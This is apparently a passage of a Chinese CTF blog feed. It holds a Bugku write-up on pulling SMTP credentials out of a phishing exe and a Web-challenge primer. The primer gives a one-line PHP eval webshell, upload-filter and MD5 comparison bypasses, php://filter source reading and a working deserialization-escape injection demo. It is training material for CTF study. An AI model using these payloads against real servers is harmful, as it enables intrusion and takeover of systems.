    <content type="html"><![CDATA[<p>虽然和Web其实没什么关系，但是真的是非常有趣啊👍</p><p align='right'><small>作者说这个题更像是MISC类...yysy，qs</small></p><span id="more"></span><h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><ul><li><p>进来发现是刷钻软件的index，其中有一地址可以下载一个易语言写的exe</p><p>  <img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-index.PNG"></p></li><li><p>手动添加admin发现管理页面存在，但是一旦尝试注入就会卡死(至少我是这样的)</p></li></ul><p>至此，其他的信息均为干扰，再没有发现任何线索，很显然刷钻exe才是关键</p><h2 id="exe分析"><a href="#exe分析" class="headerlink" title="exe分析"></a>exe分析</h2><h3 id="方法一：抓smtp包"><a href="#方法一：抓smtp包" class="headerlink" title="方法一：抓smtp包"></a>方法一：抓smtp包</h3><p>先看本体，就是一个钓鱼软件</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-exe.PNG"></p><p>最简单也是最常见的钓鱼就是用smtp发邮件出去，但在通过smtp送信时是需要smtp授权码的，故只要抓个smtp包看邮箱和密码即可</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-pack.PNG"></p><p>关键字<code>AUTH LOGIN</code>登录认证，将下文的发送的字段b64decode一下，得到邮箱与密码</p><h3 id="方法二：IDA"><a href="#方法二：IDA" class="headerlink" title="方法二：IDA"></a>方法二：IDA</h3><p>除了抓包查看邮箱与密码，在exe中的邮箱和密码也是保存为静态字段的，拖进IDA去字符串页面找即可</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-IDA.PNG"></p><h2 id="登录邮箱"><a href="#登录邮箱" class="headerlink" title="登录邮箱"></a>登录邮箱</h2><p>需要注意的是我们找到的是smtp授权码，而非邮箱的登陆密码，故不能在网易邮箱直接登录（别问，问就是虽然知道smtp授权码和登陆密码是两码事，但是还是试了好久），面向搜索引擎解题我们得知应该用第三方的邮箱客户端，并选择使用smtp协议登录，例如<code>FoxMail</code>，登录后可以找到管理员补档的被删除的eml格式的附件，foxmail本身或微软自带邮箱就可以打开</p><blockquote>EML格式是微软公司在Outlook中所使用的一种遵循RFC822及其后续扩展的文件格式，并成为各类电子邮件软件的通用格式——百度百科</blockquote><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-mail.PNG"></p><p>打开附件后为邮件对话截图，好心的管理还画出了关键信息，结合题目中提到“社工”，显然此处交代了后台管理的用户名即为发件人署名，密码为生日密码，以此登录后台后稍微翻翻就看到flag啦~</p><p align='right'><small>非常有趣</small></p><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;虽然和Web其实没什么关系，但是真的是非常有趣啊👍&lt;/p&gt;
&lt;p align=&#39;right&#39;&gt;&lt;small&gt;作者说这个题更像是MISC类...yysy，qs&lt;/small&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
    <category term="wp" scheme="https://kyriota.github.io/tags/wp/"/>
    
    <category term="bugku" scheme="https://kyriota.github.io/tags/bugku/"/>
    
  </entry>
  
  <entry>
    <title>Web Basic Requirement</title>
    <link href="https://kyriota.github.io/2021/03/16/Web_Basic_Requirement/"/>
    <id>https://kyriota.github.io/2021/03/16/Web_Basic_Requirement/</id>
    <published>2021-03-16T08:33:52.000Z</published>
    <updated>2021-05-06T11:28:26.958Z</updated>
    
    <content type="html"><![CDATA[<p>系统性收录解决Web题目需要的前置知识，过于零碎的知识未整合</p><span id="more"></span><hr><h1 id="PHP-amp-HTTP"><a href="#PHP-amp-HTTP" class="headerlink" title="PHP&amp;HTTP"></a><big><center>PHP&amp;HTTP</center></big></h1><p align="right"><small>PHP is the best language in the world</small></p><h2 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie,session,token"></a><big>cookie,session,token</big></h2><p>这三个东西的最基本的目的都是区分用户，标识身份，形式不同而已</p><ul><li><p>cookie：小饼干，按F12就可以找到当前页面存放的cookie，本地缓存，由服务器生成，在下次请求时又发回服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间，所以每个域的cookie数量是有限的。由于cookie是人为设置的，所以cookie中可能藏有题目的hint</p></li><li><p>session：会话，服务端临时缓存用户的数据，用户离开网站后立即销毁，python requests中就有保留会话的方法</p></li></ul><p><img src="/images/session.jpg"></p><ul><li>token：因为当用户更换访问的服务器时，若session没有同步到位，则用户又需要重新登陆，token 就解决了这个问题。它将状态保存在客户端，并且借助加密算法进行验证保证安全性</li></ul><p><img src="/images/token.jpg"></p><h2 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a><big>HEADER</big></h2><p>响应头，是服务器以HTTP协议传HTML资料到浏览器前所送出的字串，便于提前判断是否接受请求以及请求的大致信息与属性，按F12就可以查看当前页面的HEADER，HEADER可以自定义，可能包含了题目的hint</p><p>其中有几个重要的HEADER需要了解</p><ul><li><code>X-Forwarded-for</code>：XFF头，含HTTP请求端的IP，但当仅使用这一响应头来验证请求段的真实IP时是不可靠的</li><li><code>Referer</code>：告诉服务器请求来自哪个链接</li><li><code>Content-type</code>：内容类型，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件，文件上传漏洞中常通过更改此 header伪造文件类型标识，请求头部中的Content-type可用大小写绕过，如Content-Type: multipart/form-data;曾在一个题目中将 multipart中的部分字母改为大写即可上传文件；而请求数据中的Content-type则直接复制粘贴即可，不同的后缀名均有对应的描述。例如下图中截包后修改Content-type头，并利用PHP不仅可以解析.PHP文件，包括.PHP2~.PHP5后缀的文件PHP都可以解析，来绕过对.PHP后缀的过滤，并成功上传</li></ul><img src="/images/WebshellUpload.png" style="zoom: 67%;" /><h2 id="PHP标签写法"><a href="#PHP标签写法" class="headerlink" title="PHP标签写法"></a><big>PHP标签写法</big></h2><p>​    有时常见的 php标签会被过滤掉，这就需要尝试更换其他标签来进行尝试</p><p>​    &lt;?php echo ‘hi’; ?&gt;  标准写法</p><p>​    &lt;script language=”php”&gt; echo 1; &lt;/script&gt;  长标签写法，在 php7.0后就不解析了</p><h2 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较"></a><big>松散比较</big></h2><p>PHP中的比较分为弱比较（==，!=）与强比较（===，!==）两种方式，因为PHP中的变量不用声明其数据类型，导致了在弱比较中的适应性变化</p><img src="/images/PHP弱比较表.png" style="zoom: 50%;" /><p>需要补充的是数字与字符串的弱比较，在进行这类比较时，会先尝试将字符串转为数字，转换规则为：若为非数字开头，则转换为<code>0</code>，若为数字开头，则转换为开头的数字，以下为示例：</p><center><code>"abd"---0</code></center><center><code>"123abc"---123</code></center><center><code>"123.456abc"---123.456</code></center><center><code>"123e4abc"---123e4</code></center><center><code>"233a233"---233</code></center><p>这样的比较，尤其是字符串转数字时科学计数法的识别，为md5的绕过埋下伏笔</p><p>而强比较会先判断数据类型是否一致，在若一致才进行对值的判断，否则直接返回false</p><h2 id="MD5碰撞与绕过"><a href="#MD5碰撞与绕过" class="headerlink" title="MD5碰撞与绕过"></a><big>MD5碰撞与绕过</big></h2><p>MD5码由<code>32</code>个字母或数字组成，因其碰撞概率相对较大，现已是一种不太可靠的Hash算法。针对PHP中的弱比较，强比较，以及md5()函数的特性，有几种常用的绕过方式。</p><ul><li><p>MD5弱比较：0e开头会被识别为科学计数法，<code>md5(aabg7XSs)</code>与 <code>md5(QNKCDZO)</code>的返回值均为 0e开头</p></li><li><p>MD5与SHA1数组绕过：MD5()与SHA1()都不能处理数组，相当于返回了NULL，虽然会产生WARNING，但它会继续执行啊，于是就这么绕过了，甚至骗过强等于。至于传参，写成：a[]=233&amp;b[]=Oops即可</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">233</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&quot;Oops&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>)===md5(<span class="variable">$b</span>))</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;it s ok&#x27;</span>;</span><br></pre></td></tr></table></figure>  <blockquote>[Out]<br>it s ok</blockquote></li></ul><ul><li><p>MD5碰撞：最经典的是这两串16进制字符串</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexString1</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;</span><br><span class="line"><span class="variable">$hexString2</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;</span><br><span class="line"></span><br><span class="line">hex2bin(<span class="variable">$hexString1</span>)===hex2bin(<span class="variable">$hexString2</span>);<span class="comment">//False</span></span><br><span class="line">md5(hex2bin(<span class="variable">$hexString1</span>))===md5(hex2bin(<span class="variable">$hexString2</span>));<span class="comment">//True</span></span><br><span class="line"><span class="comment">//都是008ee33a9d58b51cfeb425b0959121c9</span></span><br><span class="line"><span class="comment">//hex2bin()，十六进制字符串转二进制字符串，要求php version&gt;=5.4</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a><big>超全局变量</big></h2><p>之所以叫做超全局变量，是因为它们在一个脚本的全部作用域中都可用，常见的超全局变量有：</p><center><code>$_GET,$_POST,$_REQUEST,$GLOBALS等</code></center><ul><li><p>GET传参方式为在url后加 <code>/?var_name=value</code>，注意需要url编码</p></li><li><p>POST传参方式为页面内提交表单或用curl，python requests，hackbar等工具，通常不用进行url编码再传输，取决于HTTP HEADER中的”Content-Type“，若为“multipart/form-data”则不需要，若为“application/x-www-form-urlencoded”则需要</p></li><li><p>REQUEST的传参方式包括GET和POST</p></li><li><p>$GLOBALS[index] 作为数组，存储了所有全局变量，变量的名字就是数组的index，包括之前说到的$_GET，$_POST，以及 {定义在当前页面内，在函数外，非类成员} 的变量。对于类中的成员变量，类中函数必须使用$this-&gt;的方式访问，不能用$GLOBALS方式</p><p>  <img src="/images/%E5%89%8D%E7%AB%AF%E8%87%B3%E5%90%8E%E7%AB%AF%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B.png"></p></li></ul><h2 id="正则表达-regex"><a href="#正则表达-regex" class="headerlink" title="正则表达-regex"></a><big><a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md">正则表达-regex</a></big></h2><p>​    <em>基本的正则表达参考链接，在 PHP中存在非常规的正则表达标识，如下表</em></p><table><thead><tr><th>字符</th><th>匹配项目</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>匹配任何字母和数字</td></tr><tr><td>[:alpha:]</td><td>匹配任何字母</td></tr><tr><td>[:blank:]</td><td>匹配blank, tab等空格符</td></tr><tr><td>[:punct:]</td><td>匹配任何标点符号 ‘! “ # $ % &amp; ‘ ( ) * + , - . / : ; &lt; = &gt; ? @ [ \ ] ^ _ ‘ { | } ~’.</td></tr><tr><td>[:digit:]</td><td>匹配任何数字</td></tr><tr><td>[:graph:]</td><td>Graphical characters: ‘[:alnum:]’ and ‘[:punct:]’.</td></tr><tr><td>[:lower:]</td><td>匹配任何小写字母</td></tr><tr><td>[:upper:]</td><td>匹配任何大写字母</td></tr><tr><td>[:print:]</td><td>Printable characters: ‘[:alnum:]’, ‘[:punct:]’, and space.</td></tr></tbody></table><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><big>一句话木马</big></h2><center><code>&lt;?php @eval($_P0ST['key']) ?&gt;</code></center><p><del>因为直接写上去会被报毒，手动把数字0改为字母O就行</del></p><p>原理在于：当有写入了这样代码的文件能够被服务器解析，且解析文件的页面可以访问，我们就可以向该页面POST一个key，其值设为任意希望服务器执行的PHP代码然后被eval执行；基于此，菜刀，蚁剑等 Webshell工具可以连接服务器后台</p><h2 id="swp备份文件"><a href="#swp备份文件" class="headerlink" title=".swp备份文件"></a><big>.swp备份文件</big></h2><p>Linux中 Vim编辑器产生的临时文件，用于备份被编辑的内容以防非正常退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim -r original_file_name.file_type.swp#终端输入此命令可以查看文件</span><br><span class="line">:w file_name.file_type#Vim中输入此命令可以保存文件到终端运行目录</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><big>文件包含漏洞</big></h2><p align="right"><small>特征：xxx.php/?file=xxx</small></p><p>include()函数：检索文件中的php代码，若存在，则执行；反之则输出原文。原本用于优化代码的重用性，但其特性使得这个函数就是造成漏洞的根本</p><ul><li>php伪协议（封装协议）：<ul><li>php://：可以访问各种I/O流，如php://input常用于file_get_contents(php://input)，这样就可以读入用户的输入流。如果直接使用<code>?file=wanted.php</code>会被解析，但想要查看源码，则可以用<code>?file=php://filter/convert.base64-encode/resource=wanted.php</code>，可以得到其b64编码后的源码，这样php://filter就作为中间流，把源码转b64，include()无法执行，于是直接输出b64编码后的源码</li><li>file://：可以访问本地文件，后接目录即可</li><li>还有如zip://，data://等协议，但目前没有做到有需要的题目</li></ul></li><li>文件上传+文件包含：当用户可以上传文件且文件目录可知，同时还存在文件包含，则用户可以通过上传任意包含了一句话木马的文件扔给include()来解析</li></ul><h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a><big>反序列化逃逸</big></h2><p>用户输入要传输到服务器，常需要过滤与序列化，但当过滤步骤放在序列化之后，则可能因为字符串逃逸而造成对象注入</p><ul><li><p>原理：过滤函数造成了序列化返回的字符串内容减少或增加的现象，但没有修改数据长度的标记（如 “php”被替换为 “NONONO”；或 “WHERE”被替换为 “MARK”），又反序列化通过识别 “;}“闭合，后面冗余的内容会被丢弃</p></li><li><p>具体的攻击形式</p><ul><li><p>在此可以先确认需要构造的对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User(<span class="string">&#x27;guest&#x27;</span>,<span class="keyword">new</span> Admin(<span class="string">&#x27;hack&#x27;</span>)));</span><br></pre></td></tr></table></figure></li></ul><blockquote>#[Out] // 原本无换行符与任何空格，为了可读性而手动添加<br>O:4:"User":2:{<br>&emsp;s:8:"username";s:5:"guest";<br>&emsp;s:6:"passwd";O:5:"Admin":1:{<br>&emsp;&emsp;s:3:"Key";s:4:"hack";<br>&emsp;}<br>}</blockquote>  </li><li><p>确定了需要构造的对象即为上文中的输出</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此处用户只能控制User类中的$username与$passwd</span></span><br><span class="line"><span class="comment">#却可以通过逃逸修改Admin类中的$Key</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;Key,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterLess</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;NO&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#减少2个字符</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterMore</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;_JESUS_&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#增加3个字符</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iusername</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$ipasswd</span>=<span class="string">&#x27;guestpass&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$iusername</span>,<span class="variable">$ipasswd</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:6:&quot;passwd&quot;;s:9:&quot;guestpass&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">HACK:</span>↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#这就是希望注入的内容，修改Admin类中的$Key为hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LESS:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======LESS START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#思想在于：标记长度不变的情况下数据减少了</span></span><br><span class="line">    <span class="comment">#也就是说会有与减少量相等的字符数量被吞并为变量的value</span></span><br><span class="line">    <span class="variable">$dataEatenByLess</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;s:41:&quot;&#x27;</span>;</span><br><span class="line">    <span class="comment">#希望被filterLess吃掉的字符串如上</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$dataEatenByLess</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//21</span></span><br><span class="line">    <span class="comment">#每个FLAG吞2字符，在passwd补一位凑3的倍数</span></span><br><span class="line">    <span class="comment">#11个FLAG吞完，吞完后要改什么变量就随心所欲了</span></span><br><span class="line">    <span class="variable">$payloadPasswd</span>=<span class="string">&#x27;0&#x27;</span>.<span class="variable">$target</span>;</span><br><span class="line">    <span class="variable">$payloadLess</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">11</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$payloadLess</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$payloadLess</span>,<span class="variable">$payloadPasswd</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    unserialize(filterLess(<span class="variable">$data</span>));<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;NONONONONONONONONONONO&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MORE:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======MORE START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#思想在于：标记长度不变的情况下数据增加了</span></span><br><span class="line">    <span class="comment">#计算好需要逃逸的量，使其刚好与增加量相等，这些字符就跑到变量的value之外了</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$target</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//53</span></span><br><span class="line">    <span class="comment">#每个FLAG溢出3个字符，需要逃逸53个字符</span></span><br><span class="line">    <span class="comment">#在逃逸字符闭合后面加上任意一个字符凑成3的倍数，18个FLAG达到溢出量</span></span><br><span class="line">    <span class="variable">$dataOverflow</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">18</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$dataOverflow</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$dataOverflow</span>.=<span class="variable">$target</span>.<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$dataOverflow</span>,<span class="string">&#x27;anything&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:126:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    unserialize(filterMore(<span class="variable">$data</span>));<span class="comment">//&#123;s:8:&quot;username&quot;;s:126:&quot;_JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS_&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="PHP太怪了"><a href="#PHP太怪了" class="headerlink" title="PHP太怪了"></a>PHP太怪了</h2><h3 id="变量套变量"><a href="#变量套变量" class="headerlink" title="变量套变量"></a>变量套变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;<span class="comment">//输出 world</span></span><br></pre></td></tr></table></figure><h3 id="变量套函数"><a 